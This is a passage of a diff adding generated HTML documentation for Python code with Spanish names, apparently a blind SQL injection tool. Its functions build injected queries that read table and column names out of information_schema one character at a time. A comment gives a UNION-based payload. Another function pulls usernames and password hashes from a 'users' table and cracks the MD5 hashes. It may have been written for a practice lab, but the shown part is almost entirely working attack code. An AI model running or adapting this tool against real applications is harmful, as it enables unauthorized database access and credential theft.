+        <span class="k">return</span> <span class="n">nombre</span></pre></div>
+    </div>
+  </div>
+  <div class='clearall'></div>
+  <div class='section' id='section-14'>
+    <div class='docs'>
+      <div class='octowrap'>
+        <a class='octothorpe' href='#section-14'>#</a>
+      </div>
+      
+    </div>
+    <div class='code'>
+      <div class="highlight"><pre>    <span class="k">def</span> <span class="nf">sacarValorPorTablaColumnaID</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">tabla</span><span class="p">,</span> <span class="n">columna</span><span class="p">,</span> <span class="n">nombre_campo_id</span><span class="p">):</span>
+        <span class="k">print</span><span class="p">(</span><span class="s1">&#39;[{asterisco}] - Sacando datos de la tabla {tabla} de la columna {columna}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">asterisco</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">color</span><span class="p">(</span><span class="s1">&#39;*&#39;</span><span class="p">,</span> <span class="n">config</span><span class="p">[</span><span class="s1">&#39;color_info&#39;</span><span class="p">]),</span> <span class="n">tabla</span><span class="o">=</span><span class="n">tabla</span><span class="p">,</span> <span class="n">columna</span><span class="o">=</span><span class="n">columna</span><span class="p">))</span>
+        <span class="n">contador_null</span> <span class="o">=</span> <span class="mi">0</span>
+        <span class="n">nombres</span> <span class="o">=</span> <span class="p">[]</span>
+        <span class="n">cantidad_registros_en_tabla</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">cantidadTuplasEnTapla</span><span class="p">(</span><span class="n">tabla</span><span class="p">,</span> <span class="n">columna</span><span class="p">)</span>        
+        <span class="k">if</span> <span class="n">cantidad_registros_en_tabla</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
+            <span class="k">print</span><span class="p">(</span><span class="s1">&#39;[{asterisco}] - {mensaje} {num} {mensaje2} {tabla}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">asterisco</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">color</span><span class="p">(</span><span class="s1">&#39;*&#39;</span><span class="p">,</span> <span class="n">config</span><span class="p">[</span><span class="s1">&#39;color_ok&#39;</span><span class="p">]),</span> <span class="n">mensaje</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">color</span><span class="p">(</span><span class="s1">&#39;Se han encontrado&#39;</span><span class="p">,</span> <span class="n">config</span><span class="p">[</span><span class="s1">&#39;color_ok&#39;</span><span class="p">]),</span> <span class="n">num</span><span class="o">=</span><span class="n">cantidad_registros_en_tabla</span><span class="p">,</span> <span class="n">mensaje2</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">color</span><span class="p">(</span><span class="s1">&#39;registros en la tabla&#39;</span><span class="p">,</span> <span class="n">config</span><span class="p">[</span><span class="s1">&#39;color_ok&#39;</span><span class="p">]),</span> <span class="n">tabla</span><span class="o">=</span><span class="n">tabla</span><span class="p">))</span>
+            <span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">cantidad_registros_en_tabla</span><span class="p">):</span> <span class="c1"># Cantidad de tuplas en users</span>
+                <span class="n">datos</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">cogerNombreDeTablaPorID</span><span class="p">(</span><span class="n">columna</span><span class="p">,</span> <span class="n">tabla</span><span class="p">,</span> <span class="n">k</span><span class="p">,</span> <span class="n">nombre_campo_id</span><span class="p">)</span>
+                <span class="k">if</span> <span class="n">datos</span><span class="p">:</span>
+                    <span class="n">nombres</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">datos</span><span class="p">)</span>
+                <span class="k">else</span><span class="p">:</span>
+                    <span class="k">if</span> <span class="n">contador_null</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+                        <span class="k">break</span>
+                    <span class="n">contador_null</span> <span class="o">+=</span> <span class="mi">1</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="k">print</span><span class="p">(</span><span class="s1">&#39;[{asterisco}] - {mensaje}</span><span class="se">\t</span><span class="s1">Tabla: {tabla} - Columna: {columna} - Campo conocido: {nombre_campo_id}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">asterisco</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">color</span><span class="p">(</span><span class="s1">&#39;*&#39;</span><span class="p">,</span> <span class="n">config</span><span class="p">[</span><span class="s1">&#39;color_error&#39;</span><span class="p">]),</span> <span class="n">mensaje</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">color</span><span class="p">(</span><span class="s1">&#39;No hay registros&#39;</span><span class="p">,</span> <span class="n">config</span><span class="p">[</span><span class="s1">&#39;color_error&#39;</span><span class="p">]),</span> <span class="n">tabla</span><span class="o">=</span><span class="n">tabla</span><span class="p">,</span> <span class="n">columna</span><span class="o">=</span><span class="n">columna</span><span class="p">,</span> <span class="n">nombre_campo_id</span><span class="o">=</span><span class="n">nombre_campo_id</span><span class="p">))</span>
+        <span class="k">return</span> <span class="n">nombres</span></pre></div>
+    </div>
+  </div>
+  <div class='clearall'></div>
+  <div class='section' id='section-15'>
+    <div class='docs'>
+      <div class='octowrap'>
+        <a class='octothorpe' href='#section-15'>#</a>
+      </div>
+      
+    </div>
+    <div class='code'>
+      <div class="highlight"><pre>    <span class="k">def</span> <span class="nf">compareTextExistWhereSubstringACII</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">tabla_name</span><span class="p">,</span> <span class="n">table</span><span class="p">):</span> <span class="c1"># Devuelve : AND ASCII(substring) ... AND ... AND ASCII(substring)</span>
+        <span class="n">sentencia</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">tabla_name</span><span class="p">)):</span>
+            <span class="n">sentencia</span> <span class="o">=</span> <span class="s1">&#39;{sentencia}AND ASCII(substring({tabla}, {i}, 1)) = {ascii} &#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">sentencia</span><span class="o">=</span><span class="n">sentencia</span><span class="p">,</span> <span class="n">tabla</span><span class="o">=</span><span class="n">table</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="p">)[</span><span class="mi">1</span><span class="p">],</span> <span class="n">i</span><span class="o">=</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span> <span class="n">ascii</span><span class="o">=</span><span class="nb">ord</span><span class="p">(</span><span class="n">tabla_name</span><span class="p">[</span><span class="n">i</span><span class="p">]))</span>
+        <span class="k">return</span> <span class="n">sentencia</span></pre></div>
+    </div>
+  </div>
+  <div class='clearall'></div>
+  <div class='section' id='section-16'>
+    <div class='docs'>
+      <div class='octowrap'>
+        <a class='octothorpe' href='#section-16'>#</a>
+      </div>
+      
+    </div>
+    <div class='code'>
+      <div class="highlight"><pre>    <span class="k">def</span> <span class="nf">transformAsciiToHex</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">ascii_text</span><span class="p">):</span>
+        <span class="n">datos</span> <span class="o">=</span> <span class="s1">&#39;0x&#39;</span>
+        <span class="k">for</span> <span class="n">letra</span> <span class="ow">in</span> <span class="n">ascii_text</span><span class="p">:</span>
+            <span class="n">datos</span> <span class="o">=</span> <span class="s1">&#39;{datos}{nuevo}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">datos</span><span class="o">=</span><span class="n">datos</span><span class="p">,</span> <span class="n">nuevo</span><span class="o">=</span><span class="nb">hex</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">letra</span><span class="p">))[</span><span class="mi">2</span><span class="p">:])</span>
+        <span class="k">return</span> <span class="n">datos</span></pre></div>
+    </div>
+  </div>
+  <div class='clearall'></div>
+  <div class='section' id='section-17'>
+    <div class='docs'>
+      <div class='octowrap'>
+        <a class='octothorpe' href='#section-17'>#</a>
+      </div>
+      
+    </div>
+    <div class='code'>
+      <div class="highlight"><pre>    <span class="k">def</span> <span class="nf">cogerColumnasTabla</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">tabla</span><span class="p">,</span> <span class="n">tabla_name</span><span class="p">):</span> <span class="c1"># information_schema.columns, table_name</span>
+        <span class="n">nombres</span> <span class="o">=</span> <span class="p">[]</span>
+        <span class="n">hexadecimal</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">transformAsciiToHex</span><span class="p">(</span><span class="n">tabla_name</span><span class="p">)</span>
+        <span class="n">sentencia_tabla_name</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">compareTextExistWhereSubstringACII</span><span class="p">(</span><span class="n">tabla_name</span><span class="p">,</span> <span class="n">tabla</span><span class="p">)</span>
+        <span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">10</span><span class="p">):</span>
+            <span class="n">nombre</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+            <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">20</span><span class="p">):</span>
+                <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">config</span><span class="p">[</span><span class="s1">&#39;lalpha&#39;</span><span class="p">])):</span>
+                    <span class="k">if</span> <span class="n">nombre</span><span class="p">:</span>
+                        <span class="n">nom</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">transformAsciiToHex</span><span class="p">(</span><span class="n">nombre</span><span class="p">)</span>
+                    <span class="k">else</span><span class="p">:</span>
+                        <span class="n">nom</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">transformAsciiToHex</span><span class="p">(</span><span class="n">config</span><span class="p">[</span><span class="s1">&#39;lalpha&#39;</span><span class="p">][</span><span class="n">j</span><span class="p">])</span>
+                    <span class="n">sentencia</span> <span class="o">=</span> <span class="s2">&quot;0 or substring((select group_concat(column_name) from {tabla} where table_schema=DATABASE() and table_name={hexadecimal}), {posicion}, 1)={comparacion}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">comparacion</span><span class="o">=</span><span class="n">nom</span><span class="p">,</span> <span class="n">tabla</span><span class="o">=</span><span class="n">tabla</span><span class="p">,</span> <span class="n">posicion</span><span class="o">=</span><span class="n">i</span><span class="p">,</span> <span class="n">hexadecimal</span><span class="o">=</span><span class="n">hexadecimal</span><span class="p">)</span>
+                    <span class="n">existe</span> <span class="o">=</span>  <span class="bp">self</span><span class="o">.</span><span class="n">ejecutarSQL</span><span class="p">(</span><span class="n">sentencia</span><span class="p">)</span>
+                    <span class="k">if</span> <span class="n">existe</span><span class="p">:</span>
+                        <span class="n">nombre</span> <span class="o">=</span> <span class="s1">&#39;{nombre}{letra}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">nombre</span><span class="o">=</span><span class="n">nombre</span><span class="p">,</span> <span class="n">letra</span><span class="o">=</span><span class="n">config</span><span class="p">[</span><span class="s1">&#39;lalpha&#39;</span><span class="p">][</span><span class="n">j</span><span class="p">])</span>
+                        <span class="k">break</span>
+            <span class="k">if</span> <span class="ow">not</span> <span class="n">nombre</span><span class="p">:</span>
+                <span class="k">break</span>
+            <span class="n">nombres</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">nombre</span><span class="p">)</span>
+        <span class="k">return</span> <span class="n">nombres</span></pre></div>
+    </div>
+  </div>
+  <div class='clearall'></div>
+  <div class='section' id='section-18'>
+    <div class='docs'>
+      <div class='octowrap'>
+        <a class='octothorpe' href='#section-18'>#</a>
+      </div>
+      
+    </div>
+    <div class='code'>
+      <div class="highlight"><pre>    <span class="k">def</span> <span class="nf">cogerTablas</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span></pre></div>
+    </div>
+  </div>
+  <div class='clearall'></div>
+  <div class='section' id='section-19'>
+    <div class='docs'>
+      <div class='octowrap'>
+        <a class='octothorpe' href='#section-19'>#</a>
+      </div>
+      <p>1&rsquo; union all select table_schema,table_name FROM information_schema.tables WHERE table_schema != &ldquo;mysql&rdquo; AND table_schema != &ldquo;information_schema&rdquo; &ndash; </p>
+    </div>
+    <div class='code'>
+      <div class="highlight"><pre>        <span class="k">pass</span></pre></div>
+    </div>
+  </div>
+  <div class='clearall'></div>
+  <div class='section' id='section-20'>
+    <div class='docs'>
+      <div class='octowrap'>
+        <a class='octothorpe' href='#section-20'>#</a>
+      </div>
+      
+    </div>
+    <div class='code'>
+      <div class="highlight"><pre>    <span class="k">def</span> <span class="nf">mostrarUserPass</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="n">nombres</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">sacarValorPorTablaColumnaID</span><span class="p">(</span><span class="n">tabla</span><span class="o">=</span><span class="s1">&#39;users&#39;</span><span class="p">,</span> <span class="n">columna</span><span class="o">=</span><span class="s1">&#39;user&#39;</span><span class="p">,</span> <span class="n">nombre_campo_id</span><span class="o">=</span><span class="s1">&#39;user_id&#39;</span><span class="p">)</span>
+        <span class="n">password</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">sacarValorPorTablaColumnaID</span><span class="p">(</span><span class="n">tabla</span><span class="o">=</span><span class="s1">&#39;users&#39;</span><span class="p">,</span> <span class="n">columna</span><span class="o">=</span><span class="s1">&#39;password&#39;</span><span class="p">,</span> <span class="n">nombre_campo_id</span><span class="o">=</span><span class="s1">&#39;user_id&#39;</span><span class="p">)</span>
+        <span class="n">contador</span> <span class="o">=</span> <span class="mi">0</span>
+        <span class="k">for</span> <span class="n">passw</span> <span class="ow">in</span> <span class="n">password</span><span class="p">:</span>
+            <span class="n">pass_dec</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">md5_decrypt</span><span class="p">(</span><span class="n">passw</span><span class="p">)</span>
+            <span class="k">print</span><span class="p">(</span><span class="s1">&#39;[{asterisco}] - {titulo_user}: {user}</span><span class="se">\t</span><span class="s1">- {titulo_passw}: {passw}</span><span class="se">\t</span><span class="s1">- {titulo_password_limpia}: {pass_limpia}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">asterisco</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">color</span><span class="p">(</span><span class="s1">&#39;*&#39;</span><span class="p">,</span> <span class="n">config</span><span class="p">[</span><span class="s1">&#39;color_ok&#39;</span><span class="p">]),</span> <span class="n">titulo_user</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">color</span><span class="p">(</span><span class="s1">&#39;User&#39;</span><span class="p">,</span> <span class="n">config</span><span class="p">[</span><span class="s1">&#39;color_ok&#39;</span><span class="p">]),</span> <span class="n">user</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">color</span><span class="p">(</span><span class="n">nombres</span><span class="p">[</span><span class="n">contador</span><span class="p">],</span> <span class="n">config</span><span class="p">[</span><span class="s1">&#39;color_ok&#39;</span><span class="p">]),</span> <span class="n">titulo_passw</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">color</span><span class="p">(</span><span class="s1">&#39;Password&#39;</span><span class="p">,</span> <span class="n">config</span><span class="p">[</span><span class="s1">&#39;color_ok&#39;</span><span class="p">]),</span> <span class="n">passw</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">color</span><span class="p">(</span><span class="n">passw</span><span class="p">,</span> <span class="n">config</span><span class="p">[</span><span class="s1">&#39;color_ok&#39;</span><span class="p">]),</span> <span class="n">titulo_password_limpia</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">color</span><span class="p">(</span><span class="s1">&#39;Password Limpia&#39;</span><span class="p">,</span> <span class="n">config</span><span class="p">[</span><span class="s1">&#39;color_ok&#39;</span><span class="p">]),</span> <span class="n">pass_limpia</span><span class="o">=</span><span class="bp">self</span><span class="o">.</span><span class="n">color</span><span class="p">(</span><span class="n">pass_dec</span><span class="p">,</span> <span class="n">config</span><span class="p">[</span><span class="s1">&#39;color_ok&#39;</span><span class="p">])))</span>
+            <span class="n">contador</span> <span class="o">+=</span> <span class="mi">1</span>
+
+</pre></div>
+    </div>
+  </div>
+  <div class='clearall'></div>
+</div>
+</body>
